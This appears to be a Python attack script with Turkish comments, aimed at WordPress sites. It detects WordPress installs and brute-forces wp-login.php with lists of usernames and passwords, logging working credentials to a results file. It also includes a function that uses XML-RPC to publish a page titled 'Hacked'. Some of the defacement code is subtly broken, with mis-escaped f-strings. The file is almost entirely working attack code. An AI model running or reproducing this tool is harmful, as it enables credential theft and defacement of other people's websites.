import requests
from urllib.parse import urlparse
from tools import colorprint
from tools import getwpusers
from wordpress_xmlrpc import Client, WordPressPost
from wordpress_xmlrpc.methods.posts import NewPost

def save(content):
    try:
        with open("results.txt", 'a') as f:  # dosya_adi adlı dosyayı aç ve yazma modunda aç
            f.write(content + "\n")  # veriyi dosyaya yaz ve bir alt satıra geç
    except IOError:  # dosya açılırken veya yazılırken bir hata oluşursa
        print("Dosya açılırken bir hata oluştu.")  # hata mesajı yazdır

def is_wordpress(url):
    try:
        response = requests.get(f"{url}/wp-login.php",timeout=15)
    except:
        return False
    if response.status_code == 200 and "wp-login.php" in response.url:
        return True
    else:
        return False

def index_method1(url,username,password,content):
    url = f'{{url}}/xmlrpc.php'

    # XML-RPC istemcisini oluşturma
    wp = Client(url, username, password)

    # Yeni bir sayfa oluşturma
    page = WordPressPost()
    page.title = 'Hacked'
    page.content = '{content}'
    page.post_status = 'publish'

    # Sayfayı kaydetme
    page_id = wp.call(NewPost(page))
    print(f'Sayfa oluşturuldu: {url}/?p={page_id}')

    pass

def brute(url, username, password):
    login_url = f'{url}/wp-login.php'
    session = requests.session()

    cookies = {
        'wordpress_test_cookie':'WP+Cookie+check'
    }

    try:
        response = session.post(login_url, data={'log': username, 'pwd': password, 'redirect_to': '/wp-admin/', 'wp-submit': 'Log In', 'testcookie': 1},
                                cookies=cookies, timeout=15)
    except:
        return None
    if 'Blocked by login security setting' in response.text:
        return None
    elif 'wp-admin' in response.url:
        if('redirect_to' in response.url):
            return False
        colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
        save(f'{url}/wp-login.php {username}:{password} Giriş Başarılı!')
        return True
    else:
       # colorprint.resultprint(f'{url}/wp-login.php {username}:{password} Giriş Başarısız!', "f")
        return False

def url2domain(url):
    parsed_url = urlparse(url)
    domain_with_protocol = parsed_url.scheme + "://" + parsed_url.netloc
    if(domain_with_protocol =="://"):
        colorprint.colorprint(f"{url} URL Protokolü bulunamadı. Otomatik http:// ekleniyor", "f")
        domain_with_protocol = "http://"+ parsed_url.netloc
    return domain_with_protocol

def fileread(url, usernames, passwords):
    for username in usernames:
        username = username.replace('-','.')
        for password in passwords:
            _brute = brute(url,username,password)
            if(_brute == True or _brute == None):
                break
        if(_brute):
            break
